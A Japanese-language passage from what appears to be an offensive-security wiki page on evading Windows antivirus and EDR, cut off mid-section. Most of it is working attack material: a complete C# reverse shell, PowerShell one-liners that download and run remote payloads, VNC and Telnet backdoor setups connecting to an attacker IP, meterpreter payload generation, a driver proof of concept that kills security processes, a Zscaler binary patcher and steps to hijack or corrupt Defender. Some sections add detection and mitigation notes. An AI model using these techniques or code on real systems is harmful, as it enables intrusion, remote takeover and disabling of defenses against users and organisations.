詳細は **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)** を参照してください。


## C# Assembly Reflection

C# バイナリをメモリにロードする手法は以前から知られており、AV に見つからずに post-exploitation ツールを実行する非常に優れた方法として今でも有効です。

payload はディスクに触れずに直接メモリへロードされるため、対処すべきなのはプロセス全体に対する AMSI のパッチだけです。

多くの C2 フレームワーク（sliver, Covenant, metasploit, CobaltStrike, Havoc など）は、C# assemblies を直接メモリ上で実行する機能をすでに提供していますが、方法はいくつかあります。

- **Fork\&Run**

これは、**新しい sacrificial process を起動**し、post-exploitation の悪意あるコードをその新しいプロセスへ inject し、悪意あるコードを実行して、終わったら新しいプロセスを kill する方法です。これには利点と欠点の両方があります。fork and run の利点は、実行が私たちの Beacon implant プロセス**の外で**行われることです。つまり、post-exploitation の動作中に何か問題が起きたり検出された場合でも、**implant が生き残る可能性がはるかに高い**です。欠点は、**Behavioural Detections** によって検出される可能性が**高くなる**ことです。

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

これは、post-exploitation の悪意あるコードを**自身のプロセス内へ** inject する方法です。これにより、新しいプロセスを作成して AV にスキャンされるのを避けられますが、欠点として、payload の実行で何か問題が起きるとクラッシュして**beacon を失う可能性がはるかに高く**なります。

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> C# Assembly のロードについてもっと読みたい場合は、この記事 [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) と InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly)) を確認してください

PowerShell から C# Assemblies をロードすることもできます。 [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) と [S3cur3th1sSh1t's video](https://www.youtube.com/watch?v=oe11Q-3Akuk) を確認してください。

## Using Other Programming Languages

[**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins) で提案されているように、侵害されたマシンに **Attacker Controlled SMB share 上にインストールされたインタプリタ環境へアクセス** させることで、他の言語を使って悪意あるコードを実行することが可能です。

Interpreter Binaries と SMB share 上の環境へのアクセスを許可することで、侵害されたマシンの**メモリ内でこれらの言語による任意コードを実行**できます。

repo によれば、Defender は依然としてスクリプトをスキャンしますが、Go, Java, PHP などを使うことで**静的シグネチャをバイパスする柔軟性が高まります**。これらの言語でランダムな未 obfuscate の reverse shell スクリプトを試したところ成功したことが確認されています。

## TokenStomping

Token stomping は、攻撃者が **access token や EDR / AV のような security prouct を操作**し、権限を下げてプロセス自体は終了させず、しかし悪意ある活動をチェックする権限は持たせないようにする技術です。

これを防ぐために、Windows では **外部プロセスが security process の token に対する handle を取得することを防ぐ**ことができます。

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

[**このブログ記事**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide) で説明されているように、victim の PC に Chrome Remote Desktop を単純に導入し、それを使って takeover し、persistent を維持するのは簡単です。
1. https://remotedesktop.google.com/ からダウンロードし、「Set up via SSH」をクリックしてから、Windows 用の MSI ファイルをクリックして MSI ファイルをダウンロードします。
2. victim 上でインストーラーを silent に実行します（admin required）: `msiexec /i chromeremotedesktophost.msi /qn`
3. Chrome Remote Desktop のページに戻って next をクリックします。ウィザードが authorization を求めてくるので、Authorize ボタンをクリックして続行します。
4. 次の parameter を少し調整して実行します: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` （GUI を使わずに pin を設定できる pin param に注意）。

## Advanced Evasion

Evasion は非常に複雑な topic で、1 つのシステム内でも多数の異なる telemetry source を考慮する必要があることがあります。そのため、成熟した環境で完全に検出を回避し続けるのはほぼ不可能です。

対峙する各環境には、それぞれ強みと弱みがあります。

より高度な Evasion techniques への足がかりとして、[@ATTL4S](https://twitter.com/DaniLJ94) によるこの talk をぜひ見てください。


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

これは [@mariuszbit](https://twitter.com/mariuszbit) による Evasion in Depth についての別の素晴らしい talk でもあります。


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

[**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) を使うと、**バイナリの一部を削除しながら**、**Defender がどの部分を悪意あるものとして検出しているか**を特定して分割してくれます。\
もう 1 つ同じことを行うツールが [**avred**](https://github.com/dobin/avred) で、サービスを提供する公開 web は [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/) にあります。

### **Telnet Server**

Windows10 までは、すべての Windows に **Telnet server** が付属しており、次のようにして（administrator として）インストールできました:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
システム起動時に**開始**し、今すぐ**実行**する:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**telnetポートを変更**（stealth）し、ファイアウォールを無効化する:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

こちらからダウンロードしてください: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html)（setup ではなく bin downloads が必要です）

**ホスト上で**: _**winvnc.exe**_ を実行して server を設定します:

- オプション _Disable TrayIcon_ を有効にする
- _VNC Password_ に password を設定する
- _View-Only Password_ に password を設定する

その後、binary _**winvnc.exe**_ と **新規に** 作成されたファイル _**UltraVNC.ini**_ を **victim** 内に移動します

#### **Reverse connection**

**attacker** は自分の **host** 上で binary `vncviewer.exe -listen 5900` を **実行** し、reverse **VNC connection** を受け取れるように **待機状態** にします。次に、**victim** 内で: winvnc daemon `winvnc.exe -run` を開始し、`winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900` を実行します

**WARNING:** stealth を維持するため、いくつかのことをしてはいけません

- すでに実行中なら `winvnc` を起動しないでください。そうしないと [popup](https://i.imgur.com/1SROTTl.png) が表示されます。`tasklist | findstr winvnc` で実行中か確認してください
- 同じ directory に `UltraVNC.ini` がない状態で `winvnc` を起動しないでください。そうしないと [the config window](https://i.imgur.com/rfMQWcf.png) が開きます
- help のために `winvnc -h` を実行しないでください。そうしないと [popup](https://i.imgur.com/oc18wcu.png) が表示されます

### GreatSCT

こちらからダウンロードしてください: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
GreatSCTの内部:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
今すぐ `msfconsole -r file.rc` で **lister** を起動し、次で **xml payload** を**実行**してください:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**現在の防御側はプロセスを非常に速く終了させます。**

### 自前の reverse shell をコンパイルする

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### 最初の C# Revershell

以下でコンパイルします:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
次と併用する:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# using compiler
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

自動ダウンロードと実行:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

C# obfuscators list: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### ビルド用インジェクターの python 使用例:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### その他のツール
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### More

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – カーネル空間から AV/EDR を殺す

Storm-2603 は、ランサムウェアを展開する前に endpoint protections を無効化するため、**Antivirus Terminator** として知られる小さなコンソールユーティリティを悪用した。このツールは **自前の脆弱だが *signed* な driver** を持ち込み、権限のある kernel operations を実行して、Protected-Process-Light (PPL) の AV services でさえブロックできない処理を行う。

Key take-aways
1. **Signed driver**: ディスクに配置されるファイルは `ServiceMouse.sys` だが、実体は Antiy Labs の “System In-Depth Analysis Toolkit” に含まれる、正規に signed された driver `AToolsKrnl64.sys` である。この driver には有効な Microsoft signature が付いているため、Driver-Signature-Enforcement (DSE) が有効でも load される。
2. **Service installation**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
1 行目は driver を **kernel service** として登録し、2 行目で起動することで `\\.\ServiceMouse` に user land からアクセスできるようにする。
3. **IOCTLs exposed by the driver**
| IOCTL code | Capability                              |
|-----------:|-----------------------------------------|
| `0x99000050` | PID を指定して任意の process を terminate する（Defender/EDR services を kill するために使用） |
| `0x990000D0` | ディスク上の任意の file を delete する |
| `0x990001D0` | driver を unload して service を remove する |

Minimal C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Why it works**:  BYOVD は user-mode protections を完全に回避する。kernel で実行される code は *protected* process を open し、terminate したり、PPL/PP や他の hardening features に関係なく kernel objects を tamper できる。

Detection / Mitigation
•  Microsoft の vulnerable-driver block list（`HVCI`, `Smart App Control`）を有効にし、Windows が `AToolsKrnl64.sys` の load を拒否するようにする。
•  新規の *kernel* services の作成を監視し、driver が world-writable directory から load された場合、または allow-list に存在しない場合に alert を出す。
•  user-mode から custom device objects への handle の後に suspicious な `DeviceIoControl` 呼び出しが続く動きを監視する。

### Bypassing Zscaler Client Connector Posture Checks via On-Disk Binary Patching

Zscaler の **Client Connector** は device-posture rules を local で適用し、結果を他の component に伝えるために Windows RPC に依存している。次の 2 つの弱い設計により、完全な bypass が可能になる。

1. Posture evaluation は **完全に client-side** で行われる（boolean が server に送られるだけ）。
2. 内部 RPC endpoints は、接続してきた executable が **Zscaler によって signed されている** ことだけを検証する（`WinVerifyTrust` 経由）。

ディスク上の 4 つの signed binaries を **patching** することで、両方の仕組みを無効化できる。

| Binary | Original logic patched | Result |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | 常に `1` を返すため、すべての check が compliant になる |
| `ZSAService.exe` | `WinVerifyTrust` への間接 call | NOP 化 ⇒ 任意の（署名なしでも）process が RPC pipes に bind できる |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | `mov eax,1 ; ret` に置換 |
| `ZSATunnel.exe` | tunnel 上の integrity checks | short-circuited |

Minimal patcher excerpt:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
原本のファイルを置き換えてサービススタックを再起動した後:

* **すべての** posture checks が **green/compliant** と表示される。
* 署名されていない、または改変された binary でも named-pipe RPC endpoints にアクセスできるようになる（例: `\\RPC Control\\ZSATrayManager_talk_to_me`）。
* 侵害された host は、Zscaler policies で定義された internal network への unrestricted access を得る。

この case study は、純粋に client-side の trust decisions と単純な signature checks が、わずかな byte patches で破られうることを示している。

## Abusing Protected Process Light (PPL) To Tamper AV/EDR With LOLBINs

Protected Process Light (PPL) は signer/level hierarchy を強制し、同等以上に protected された process だけが互いを tamper できるようにする。攻撃的には、PPL-enabled binary を正当に launch でき、その arguments を制御できるなら、benign な機能（例: logging）を、AV/EDR が使う protected directories に対する制限付きの、PPL-backed write primitive に変えられる。

process を PPL として実行する条件
- target EXE（および読み込まれるすべての DLLs）は、PPL-capable EKU で署名されていなければならない。
- process は CreateProcess を使って `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS` フラグ付きで作成されなければならない。
- binary の signer に一致する compatible な protection level を要求する必要がある（例: anti-malware signers には `PROTECTION_LEVEL_ANTIMALWARE_LIGHT`、Windows signers には `PROTECTION_LEVEL_WINDOWS`）。不正な level では作成に失敗する。

PP/PPL と LSASS protection のより広い intro はこちらも参照:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Open-source helper: CreateProcessAsPPL（protection level を選択し、target EXE に arguments を forward する）:
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Usage pattern:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- 署名済みのシステムバイナリ `C:\Windows\System32\ClipUp.exe` は self-spawn し、呼び出し元が指定したパスへ log file を書き込むための parameter を受け付ける。
- PPL process として起動すると、その file write は PPL backing 付きで実行される。
- ClipUp は space を含む path を解析できないため、通常は保護された場所を指すときは 8.3 short paths を使う。

8.3 short path helpers
- short names を一覧表示: 各 parent directory で `dir /x`
- cmd で short path を導出: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) launcher（例: CreateProcessAsPPL）を使って、PPL 対応の LOLBIN（ClipUp）を `CREATE_PROTECTED_PROCESS` 付きで起動する。
2) ClipUp の log-path argument を渡して、保護された AV directory（例: Defender Platform）内に file creation を強制する。必要なら 8.3 short names を使う。
3) 対象 binary が通常、AV によって起動中に open/locked される場合（例: MsMpEng.exe）、先に起動する auto-start service を install して、boot 時に write を AV より前に実行するよう schedule する。Process Monitor（boot logging）で boot ordering を validate する。
4) reboot 時に PPL-backed write が AV に binary を lock される前に発生し、target file を破損させて startup を阻止する。

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
## Notes and constraints
- `ClipUp` が書き込む内容は配置以外は制御できない。これは正確なコンテンツ注入よりも破壊に向いた primitive である。
- サービスのインストール/起動と reboot window のために local admin/SYSTEM が必要。
- タイミングが重要: ターゲットは開かれていない必要がある。boot-time execution により file locks を回避できる。

## Detections
- 起動時付近に、通常でない launcher に parented された `ClipUp.exe` の process creation、特に unusual arguments 付き。
- suspicious binaries を auto-start に設定した新規 services が、Defender/AV より一貫して先に起動している。Defender 起動失敗の前に行われた service creation/modification を調査する。
- Defender binaries/Platform directories に対する file integrity monitoring。protected-process flags を持つ processes による予期しない file creations/modifications。
- ETW/EDR telemetry: `CREATE_PROTECTED_PROCESS` で作成された processes と、AV 以外の binary による anomalous PPL level usage を確認する。

## Mitigations
- WDAC/Code Integrity: どの signed binaries を PPL として実行できるか、またどの parent の下で実行できるかを制限する。正当な文脈以外での ClipUp invocation を block する。
- Service hygiene: auto-start services の creation/modification を制限し、start-order manipulation を監視する。
- Defender tamper protection と early-launch protections が有効であることを確認する。binary corruption を示す startup errors は調査する。
- 環境と互換性がある場合、security tooling を配置する volume では 8.3 short-name generation を無効化することを検討する（十分にテストすること）。

## References for PPL and tooling
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## Tampering Microsoft Defender via Platform Version Folder Symlink Hijack

Windows Defender は、以下の配下の subfolders を列挙して実行する platform を選択する:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

lexicographic に最も大きい version string を持つ subfolder（例: `4.18.25070.5-0`）を選び、その後、その場所から Defender service processes を開始する（service/registry paths もそれに応じて更新される）。この選択は directory reparse points（symlinks）を含む directory entries を信用する。administrator はこれを利用して Defender を attacker-writable path に redirect し、DLL sideloading または service disruption を実現できる。

### Preconditions
- Local Administrator（Platform folder 下に directories/symlinks を作成するために必要）
- reboot できること、または Defender platform の再選択を trigger できること（boot 時の service restart）
- built-in tools のみでよい（`mklink`）

### Why it works
- Defender は自身の folders への writes を block するが、platform selection は directory entries を信用し、target が protected/trusted path に解決されるかを検証せずに lexicographically 最も大きい version を選ぶ。

### Step-by-step (example)
1) 現在の platform folder の writable clone を準備する。例: `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Platform 内に、あなたのフォルダを指す、より高いバージョンのディレクトリ symlink を作成する:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) トリガーの選択（再起動を推奨）:
```cmd
shutdown /r /t 0
```
4) MsMpEng.exe (WinDefend) がリダイレクトされたパスから実行されていることを確認する:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
`C:\TMP\AV\` 配下の新しいプロセスパスと、その場所を反映している service configuration/registry を確認してください。

Post-exploitation options
- DLL sideloading/code execution: Defender が application directory から読み込む DLL を drop/replace して、Defender の process 内で code を実行する。上のセクションを参照: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: version-symlink を削除すると、次回 start 時に configured path が解決できず、Defender は start に失敗する:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> Note that This technique does not provide privilege escalation by itself; it requires admin rights.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red teamは、IAT (Import Address Table) をhookし、選択したAPIをattacker-controlledなposition-independent code (PIC) 経由でルーティングすることで、runtime evasionをC2 implantの外、target module自体の中へ移動できます。これにより、evasionは多くのkitsが公開する小さなAPI surface（例: CreateProcessA）を超えて一般化され、同じ保護を BOFs と post-exploitation DLLs にも拡張できます。

High-level approach
- reflective loader（prepended または companion）を使って、target module の横にPIC blobをstageします。PICはself-contained かつ position-independent である必要があります。
- host DLL がloadされると、その IMAGE_IMPORT_DESCRIPTOR を走査し、target imports（例: CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc）のIAT entriesを、薄いPIC wrappersへpatchします。
- 各PIC wrapperはreal API addressへtail-callする前にevasionを実行します。典型的なevasionには以下が含まれます:
- callの前後で memory をmask/unmaskする（例: beacon regions をencryptする、RWX→RX にする、page names/permissions を変更する）そしてcall後にrestoreする。
- Call-stack spoofing: benign stack を構築し、target API へtransitionして、call-stack analysis が期待される frames をresolveするようにする。
- compatibility のため、Aggressor script（または同等のもの）が Beacon、BOFs、post-ex DLLs に対してどのAPIをhookするかをregisterできる interface をexportします。

Why IAT hooking here
- tool code を変更したり、Beacon に特定APIのproxyを依存したりせずに、そのhookされたimportを使う任意のcodeで動作します。
- post-ex DLLs をカバーします: LoadLibrary* をhookすると module loads（例: System.Management.Automation.dll, clr.dll）をinterceptでき、それらのAPI callsにも同じ masking/stack evasion を適用できます。
- CreateProcessA/W をwrapすることで、call-stack-based detections に対する process-spawning post-ex commands の信頼できる利用を回復します。

Minimal IAT hook sketch (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Notes
- リロケーション/ASLR の後、import を初回使用する前に patch を適用すること。TitanLdr/AceLdr のような Reflective loaders は、読み込まれた module の DllMain 中に hooking する例を示している。
- wrapper は極小かつ PIC-safe に保つこと。patch 前に捕捉した元の IAT 値、または LdrGetProcedureAddress を使って真の API を解決する。
- PIC には RW → RX の遷移を使い、writable+executable な page を残さないこと。

Call‑stack spoofing stub
- Draugr-style の PIC stub は、偽の call chain（benign module への return address）を構築してから real API に pivot する。
- これは、Beacon/BOFs から sensitive APIs へ向かう canonical stack を期待する detection を回避する。
- stack cutting / stack stitching 技術と組み合わせ、API prologue の前に期待される frame 内へ着地させる。

Operational integration
- reflective loader を post-ex DLL の先頭に付け、DLL 読み込み時に PIC と hooks が自動初期化されるようにする。
- Aggressor script を使って target APIs を登録し、Beacon と BOFs が code changes なしで同じ evasion path の恩恵を透過的に受けられるようにする。

Detection/DFIR considerations
- IAT integrity: non-image（heap/anon）address に解決される entry; import pointer の定期検証。
- Stack anomalies: loaded image に属さない return address; non-image PIC への abrupt な transition; 一貫しない RtlUserThreadStart ancestry.
- Loader telemetry: IAT への in-process writes、import thunk を変更する早期の DllMain activity、load 時に作成される unexpected RX region.
- Image-load evasion: LoadLibrary* を hook する場合、memory masking events と相関する automation/clr assemblies の suspicious load を監視する。

Related building blocks and examples
- load 中に IAT patching を行う Reflective loaders（例: TitanLdr, AceLdr）
- Memory masking hooks（例: simplehook）と stack-cutting PIC（stackcutting）
- PIC call-stack spoofing stubs（例: Draugr）


## Import-Time IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)

### Import-time IAT hooks via a resident PICO

Reflective loader を制御できるなら、loader の `GetProcAddress` pointer を、hook を先に確認する custom resolver に置き換えることで、`ProcessImports()` 中に import を hook できる:

- 一時的な loader PIC が self-free した後も残る **resident PICO**（persistent PIC object）を build する。
- loader の import resolver を上書きする `setup_hooks()` function を export する（例: `funcs.GetProcAddress = _GetProcAddress`）。
- `_GetProcAddress` では ordinal import を skip し、`__resolve_hook(ror13hash(name))` のような hash-based hook lookup を使う。hook があればそれを返し、なければ real `GetProcAddress` に delegate する。
- Crystal Palace の `addhook "MODULE$Func" "hook"` entry で link time に hook target を register する。hook は resident PICO 内にあるため valid のまま維持される。

これにより、load 後に loaded DLL の code section を patch することなく、**import-time IAT redirection** が可能になる。

### Target が PEB-walking を使う場合に hook 可能な import を強制する

Import-time hooks は、その function が target の IAT に実際に存在する場合にのみ発火する。module が PEB-walk + hash で API を解決する場合（import entry なし）、loader の `ProcessImports()` path がそれを認識できるよう、real import を強制する:

- hashed export resolution（例: `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`）を、`&WaitForSingleObject` のような direct reference に置き換える。
- compiler が IAT entry を emit し、reflective loader が imports を解決する際に interception を可能にする。

### `Sleep()` を patch せずに Ekko-style の sleep/idle obfuscation を行う

`Sleep` を patch する代わりに、implant が使う **実際の wait/IPC primitive**（`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`）を hook する。長い wait では、idle 中に in-memory image を encrypt する Ekko-style obfuscation chain で call を包む:

- `CreateTimerQueueTimer` を使い、`NtContinue` を crafted な `CONTEXT` frame で呼ぶ callback の sequence を schedule する。
